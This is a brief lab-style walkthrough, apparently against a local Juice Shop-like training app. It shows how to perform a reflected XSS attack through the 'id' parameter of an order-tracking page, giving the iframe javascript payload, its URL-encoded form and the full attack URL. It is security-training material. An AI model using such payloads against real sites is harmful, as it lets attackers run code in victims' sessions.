## Reflected XSS
### Perform a reflected XSS attack with <iframe src="javascript:alert(`xss`)">

Login as user and click `Account` > `Orders & Payment` > `Track Orders` > type a search string eg. `test`

Notice that the inputs were directly reflected into the output page. The url used was `http://192.168.247.136:3000/#/track-result?id=test`. The XSS will be placed in the `id=` parameter.

To perform a reflected XSS attack url encode 
````
<iframe src="javascript:alert(`xss`)">
````

to 
```
<iframe%20src%3D"javascript:alert(%60xss%60)"> 
```

Now reflect XSS attack can be achieved by using the url `http://192.168.247.136:3000/#/track-result?id=<iframe%20src%3D"javascript:alert(%60xss%60)">`


Note: We modified the url to include a XSS attack such that any logged in user who clicks the link will execute our malicious XSS code (within the victim's session context eg. We are making the victim to execute malicious commands on our behalf)